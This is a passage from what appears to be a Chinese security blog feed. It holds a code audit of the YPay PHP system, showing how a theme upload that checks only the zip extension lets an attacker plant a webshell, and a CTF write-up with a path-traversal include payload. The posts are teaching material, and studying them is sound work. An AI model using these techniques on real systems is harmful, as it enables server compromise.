class="number">200</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;extend&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很明显，<code>getJson()</code>方法没有明确涉及文件上传的操作。那么文件上传的操作功能应该由<code>Up::putFile()</code>方法实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">validate</span>([<span class="string">&#x27;file&#x27;</span> =&gt; [</span><br><span class="line">                <span class="string">&#x27;fileSize&#x27;</span> =&gt; <span class="number">410241024</span>,</span><br><span class="line">                <span class="string">&#x27;fileExt&#x27;</span> =&gt; <span class="string">&#x27;jpg,jpeg,png,bmp,gif&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;fileMime&#x27;</span> =&gt; <span class="string">&#x27;image/jpeg,image/png,image/gif&#x27;</span>,</span><br><span class="line">            ]])-&gt;<span class="title function_ invoke__">check</span>([<span class="string">&#x27;file&#x27;</span> =&gt; <span class="variable">$file</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (/think/exception/ValidateException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;上传失败&#x27;</span>, <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">201</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$k</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">getConfig</span>()[<span class="string">&#x27;file-type&#x27;</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="comment">//阿里云上传</span></span><br><span class="line">               ···</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">getConfig</span>()[<span class="string">&#x27;file-type&#x27;</span>] == <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="comment">//七牛上传</span></span><br><span class="line">                ···</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$savename</span> = <span class="string">&#x27;/&#x27;</span> . <span class="string">&#x27;upload&#x27;</span> . <span class="string">&#x27;/&#x27;</span> . /think/facade/<span class="title class_">Filesystem</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;public&#x27;</span>)-&gt;<span class="title function_ invoke__">putFile</span>(<span class="variable">$path</span>, <span class="variable">$k</span>);</span><br><span class="line">                <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="variable">$savename</span>);</span><br><span class="line">                <span class="title class_">AdminPhoto</span>::<span class="title function_ invoke__">add</span>(<span class="variable">$k</span>, <span class="variable">$name</span>, <span class="variable">$path</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;上传成功&#x27;</span>, <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;data&#x27;</span> =&gt; [<span class="string">&#x27;src&#x27;</span> =&gt; <span class="variable">$name</span>, <span class="string">&#x27;thumb&#x27;</span> =&gt; <span class="variable">$name</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首当其冲的就是<code>validate()</code>验证方法。<code>fileMime</code>是可以伪造的，<code>fileSize</code> 大约为 <strong>391.5 MB</strong>，但是<code>fileExt</code>只允许图片。所以我们必须要弄清楚具体的文件名后缀检测机制。</p><p>手段齐出，终于在<code>YPay/vendor/opthink/framework/src/think/Validate.php</code>里找到了底层逻辑：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240813123024049.png" alt="image-20240813123024049"></p><p>底层代码使用<code>in_array()</code>函数进行白名单检测，因为该项目的<code>PHP</code>环境大于<code> PHP5.2.3</code>，所以<code>%00</code>截断失败。很显然这处文件上传没法利用。</p><h3 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h3><h4 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h4><p><em>强大的hacker拥有无数种思维</em></p><p>从<strong>第一次尝试</strong>我们得知，如果某一处文件上传出现了<strong>文件后缀名检测</strong>，那么这一处文件上传就无法利用。我怀着这样的想法查看了大多数文件上传程序，发现这些程序都需要后缀名检测。按照当前的想法，我毫无头绪，既然没有头绪，就应该对事情进行深入的思考：</p><p>我们认为<strong>可利用</strong>的文件上传漏洞点是不存在<strong>文件后缀名检测</strong>这一步的，因为这一步使我们<strong>无法上传<code>PHP</code>文件</strong>。可是这只是阻止我们<strong>直接上传</strong><code>PHP</code>文件。如果有<strong>承载</strong>着<code>PHP</code>文件的<strong>载体</strong>，程序只检查载体的后缀名是否在白名单里，那么岂不是让我们<strong>间接上传</strong>了<code>PHP</code>文件？</p><p>想比读者已经猜出来了，只有文件夹可以承载<code>PHP</code>文件，而文件夹上传的形式是<strong>压缩包</strong>，所以我们可以尝试<strong>压缩包上传程序</strong>。</p><p>我在<code>.../app/admin/controller/ypay/Home.php</code>里找到了一处压缩包上传：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240813192640159.png" alt="image-20240813192640159"></p><p>可访问的方法，可控的参数，满足了漏洞利用的基础条件。再细看程序，跟进<code>Up::themePutFile()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">themePutFile</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">validate</span>([<span class="string">&#x27;file&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;fileExt&#x27;</span> =&gt; <span class="string">&#x27;zip&#x27;</span>,</span><br><span class="line">        ]])-&gt;<span class="title function_ invoke__">check</span>([<span class="string">&#x27;file&#x27;</span> =&gt; <span class="variable">$file</span>]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (/think/exception/ValidateException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;上传失败&#x27;</span>, <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">201</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 上传目录</span></span><br><span class="line">    <span class="variable">$uploadPath</span> = <span class="title function_ invoke__">public_path</span>() . <span class="string">&#x27;/home/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件移动到上传目录</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">move</span>(<span class="variable">$uploadPath</span>, <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getOriginalName</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$info</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取上传后的文件路径和文件名</span></span><br><span class="line">        <span class="variable">$filePath</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getPathName</span>();</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getFileName</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断文件类型</span></span><br><span class="line">        <span class="variable">$extension</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getExtension</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$extension</span> == <span class="string">&#x27;zip&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是否是一个文件夹</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">                <span class="comment">// 解压文件夹</span></span><br><span class="line">                <span class="variable">$zip</span> = <span class="keyword">new</span> /<span class="title function_ invoke__">ZipArchive</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filePath</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$uploadPath</span>);</span><br><span class="line">                    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                     <span class="comment">// 删除上传的压缩包文件</span></span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$filePath</span>);</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">200</span> ,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;上传成功&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">201</span> ,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;无法打开压缩文件&#x27;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 创建以压缩包名字命名的文件夹并解压</span></span><br><span class="line">                <span class="variable">$folderName</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_FILENAME);</span><br><span class="line">                <span class="variable">$folderPath</span> = <span class="variable">$uploadPath</span> . <span class="variable">$folderName</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$folderPath</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$folderPath</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$zip</span> = <span class="keyword">new</span> /<span class="title function_ invoke__">ZipArchive</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filePath</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$folderPath</span>);</span><br><span class="line">                    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                   <span class="comment">// 删除上传的压缩包文件</span></span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$filePath</span>);</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">200</span> ,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;上传成功&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">201</span> ,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;无法打开压缩文件&#x27;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 删除上传的文件</span></span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filePath</span>);</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">201</span> ,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;不支持的文件类型&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">201</span> ,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这处压缩包上传同样有<strong>文件名后缀检查</strong>，但是只检查压缩包后缀，并不检查压缩包里的文件名后缀。</p><p>现在我们回顾一下文件上传漏洞的三点要求：</p><ol><li>相关方法的<code>waf</code>是否可以绕过</li><li>文件最终存放的路径是如何构造的</li><li>我们以什么形式访问上传的文件</li></ol><p>对于第一点，这里并没有<code>waf</code>。</p><p>对于第二点，请看下面代码：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240813193549828.png" alt="image-20240813193549828"></p><p>跟进<code>public_path()</code>方法，</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240813193827917.png" alt="image-20240813193827917"></p><p>一言以蔽之，<code>public_path()</code>方法返回项目的根目录。</p><p>此外，程序会先创建文件夹，再解压。也就是说如果上传一个<code>pax</code>文件夹，那么木马最终的路径就是<code>.../src/public/home/pax/pax/pax.php</code></p><p>前两点与第三点比较割裂，我们先完成第二点。</p><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p>怎么访问<code>.../src/app/dmin/controller/ypay/Home.php</code>呢，正好看到一个例子：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240814112008352.png" alt="image-20240814112008352"></p><p>接着找找，发现了上传主题的地方：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240814112638708.png" alt="image-20240814112638708"></p><p>然后上传主题：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240814112704268.png" alt="image-20240814112704268"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>第二点已经完成，现在需要完成第三点：我们以什么形式访问上传的文件？</p><p>其实最简单的方法就是直接访问<code>PHP</code>文件，服务器识别出这个文件是 <code>PHP</code> 格式的，就会将这个文件传递给 <code>PHP</code> 解析器。解析器会执行文件中的 <code>PHP</code> 代码——这就达成了我们的目的。</p><blockquote><p>附：如果有些目录没有访问的权限，那么上述方法就失败了。</p></blockquote><p>直接访问<code>PHP</code>文件需要知道文件存放路径：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240814113804828.png" alt="image-20240814113804828"></p><p>前端访问成功，直接上蚁剑：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240814114809521.png" alt="image-20240814114809521"></p><p>至此审计结束~</p><hr><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p><strong>回顾</strong></p><p>这一次审计的思路是如何呢？</p><p>本次审计<code>YPay</code>的文件上传漏洞，我通过全局搜索关键词<code>upload</code>来寻找危险函数。在第一次尝试中，我发现了可以访问的危险函数和可控的变量，但是该函数的白名单机制阻止了我。白名单为什么能阻止我，因为它不允许我<strong>直接</strong>上传<code>PHP</code>文件。既然不能直接上传，那为什么不想想可不可以<strong>间接</strong>上传<code>PHP</code>文件呢？当然可以，主题上传对应的危险函数就没有检查压缩包里面文件的后缀名。上传成功也就几乎意味着<code>getshell</code>，上蚁剑即可。</p><p><strong>反省</strong></p><p>本人的思维还是不够灵活，没有想到间接上传这一点。作为一名黑客，必须要有<strong>间接利用</strong>这个核心思维，而这个思维要求我们从本质上看待问题。</p><p>那么怎么培养这个思维呢？</p><ul><li>首先就是要多思考事情的本质，对此我要清晰的知道每时每刻自己在做什么，这么做是<strong>通过什么原理</strong>达成目的的，这个原理能不能用别的方法实现。</li><li>多积累，多思考各种方法的异同点。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道include目录穿越</title>
      <link href="/2024/08/11/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>/2024/08/11/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>写完题目后马上就逻辑清晰，但是在写题时又总是身在局中不知何往，还得加强对逻辑推理的培养。</p><h1 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h1><blockquote><ul><li>题目来源：[HCTF 2018]WarmUp</li><li>题解推荐：<a href="https://xie.infoq.cn/article/53d38996c4759ee560d0aec92">HCTF 2018]WarmUp题解（较为详细的）_Web_w010w_InfoQ写作社区</a></li></ul></blockquote><p>题目入口如图：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811160307154.png" alt="image-20240811160307154"></p><p>查看源码：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811160343192.png" alt="image-20240811160343192"></p><p>注释提示<code>source.php</code>文件。</p><blockquote><p>当时没有重视这里的提示，臆想入口页面就是<code>source.php</code>，后来用<code>dirsearch</code>扫后才发现<code>source.php</code>另是其他，可见写题目时切忌主观臆断，要保持清晰的思维。</p></blockquote><p>那么现在有入口点了。</p><h1 id="0x02-冲突"><a href="#0x02-冲突" class="headerlink" title="0x02 冲突"></a>0x02 冲突</h1><p><code>source.php</code>源码如下</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811161236296.png" alt="image-20240811161236296"></p><p>简单解释两个函数：</p><ul><li><code>mb_substr()</code> ：用于从多字节字符串中提取子字符串，示例如下：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&quot;你好，世界！&quot;</span>; </span><br><span class="line"><span class="variable">$sub</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$string</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sub</span>; <span class="comment">// 输出 &quot;好，</span></span><br></pre></td></tr></table></figure><ul><li><code>mb_strpos()</code> 用于查找多字节字符串中子字符串首次出现的位置，示例如下：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span> = <span class="string">&quot;你好，世界！&quot;</span>;</span><br><span class="line"><span class="variable">$position</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$string</span>, <span class="string">&quot;世界&quot;</span>, <span class="number">0</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$position</span>; <span class="comment">// 输出 4</span></span><br></pre></td></tr></table></figure><p>知道了上述两个函数，那么源码的逻辑也就很清晰了。另外，<code>hint.php</code>文件给出提示：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811161859310.png" alt="image-20240811161859310"></p><p>整理一下目前的思路：我们可以操控<code>file</code>参数进行文件包含，这不难让人联想到<strong>目录穿越</strong>。但是<code>file</code>参数要经过白名单检查（下图仅是一处检查）：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811162155142.png" alt="image-20240811162155142"></p><p>矛盾之处：</p><ul><li>如果<code>file=source.php</code>，那么显然无法访问到<code>flag</code>所在文件。</li><li>如果file&#x3D;<code>../../../../ffffllllaaaagggg</code>，那么白名单就无法绕过。</li></ul><p>显然，正常的思路无法同时满足<code>include</code>和白名单。</p><h1 id="0x03-深入"><a href="#0x03-深入" class="headerlink" title="0x03 深入"></a>0x03 深入</h1><p>我们目前的思路非常明确，不用去想其他乱七八糟的，就是使参数<code>file</code>同时满足<code>include</code>目录穿越和白名单。</p><p>假定上述的思路是对的，那么突破点很可能就是可以兼容上述两个条件的漏洞——这样的漏洞往往就在条件本身。</p><p>细看这一处白名单检查：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811163451770.png" alt="image-20240811163451770"></p><p>结合题目，该处代码会把<strong>参数<code>file</code>的值里的</strong><code>?</code>前面的字符串提取出来并检测提取的字符串是否在白名单中。很明显，这段代码只要参数<code>file</code>的前一部分（以问号为分界线）。</p><p>再看<code>include</code>：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811163946343.png" alt="image-20240811163946343"></p><p>include的路径是参数<code>file</code>的全部。</p><blockquote><p>怎么兼容呢，这里我想了很久。我最初的想法是前一半满足白名单，后一半满足<code>include</code>，这是极为局限的想法。</p></blockquote><p><strong>没有思路，不妨先写下自己能把握的</strong>，如下：</p><p><code>file=source.php?&lt;没想出来的地方&gt;</code></p><p>怎么让<code>source.php?&lt;没想出来的地方&gt;</code>合法呢，也就是可以被<code>include</code>正确解析呢？首先要知道哪些是可以变的，哪些是不变的。</p><p>很明显，<code>source.php?</code>是不变的，<code>?</code>一般不用于文件名，这样的文件名在<code>include</code>里肯定不会被正确解析，同时<code>?</code>在<code>include</code>里也不能作为通配符使用。那么我就猜，<code>?</code>可以作为目录名的一部分——使<code>source.php?</code>作为目录名。<code>source.php?</code>要能被认作目录，需要在其后面添加一个<code>/</code>，变成<code>source.php?/</code>。</p><p>很明显，<code>source.php?</code>作为一个虚假的目录是无法被正确解析的，再者我们也不需要包含<code>source.php?</code>目录，我们只需要包含<code>flag</code>所在文件。那么有没有一个办法可以允许<code>source.php?</code>字符串存在的情况下，不解析<code>source.php?</code>目录而正确解析<code>fffflllaaaagggg</code>文件呢？如下：</p><blockquote><p>在<code>PHP</code>里，<code>include</code>只会包含最终的文件路径，其中某一个目录是否存在并不影响，只要最终的文件路径存在即可。</p></blockquote><p>那么目录<code>source.php?</code>不存在又何妨，不知道当前目录又何妨（<code>source.php?</code>目录基于当前目录），payload后面是完全可控的，使目录穿越到上游即可。payload如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span>=<span class="keyword">source</span>.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>../fffflllaaaagggg</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/./../images/posts/%E4%B8%80%E9%81%93include%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/image-20240811170118404.png" alt="image-20240811170118404"></p><h1 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h1><p>本篇文件的知识点其实不多，更多的是一步一步的推理。</p>]]></content>
      
      
      <categories>
          
          <category> CTF题目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑推理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF之信息收集</title>
      <link href="/2024/08/11/CTF%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/08/11/CTF%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><a href="https://blog.csdn.net/2301_81556781/article/details/140107995">CTF信息搜集篇 与 敏感信息搜集方法_ctf 信息搜集-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java入门</title>
      <link href="/2024/08/08/Java%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/08/Java%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows设置自定义环境变量</title>
      <link href="/2024/08/08/windows%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
      <url>/2024/08/08/windows%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
      
